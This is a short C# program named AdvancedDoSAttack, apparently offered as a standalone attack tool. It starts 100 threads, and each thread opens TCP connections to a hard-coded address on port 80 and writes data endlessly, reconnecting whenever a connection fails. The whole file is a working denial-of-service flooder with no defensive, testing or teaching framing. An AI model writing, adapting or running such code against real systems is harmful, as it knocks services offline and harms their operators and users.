using System;
using System.Net.Sockets;
using System.Threading;

public class AdvancedDoSAttack {
private const string targetIP = "192.168.1.1";
private const int port = 80;
private static readonly byte[] buffer = new byte[1024];

public static void Main(string[] args) {
for (int i = 0; i < 100; i++) { // Initiate 100 threads
new Thread(DoSAttack).Start();
}
}

private static void DoSAttack() {
while (true) {
try {
using(TcpClient client = new TcpClient(targetIP, port)) {
NetworkStream stream = client.GetStream();
while (true) {
stream.Write(buffer, 0, buffer.Length);
}
}
} catch (Exception) {
Console.WriteLine("Connection unsuccessful. Retrying...");
}
}
}
}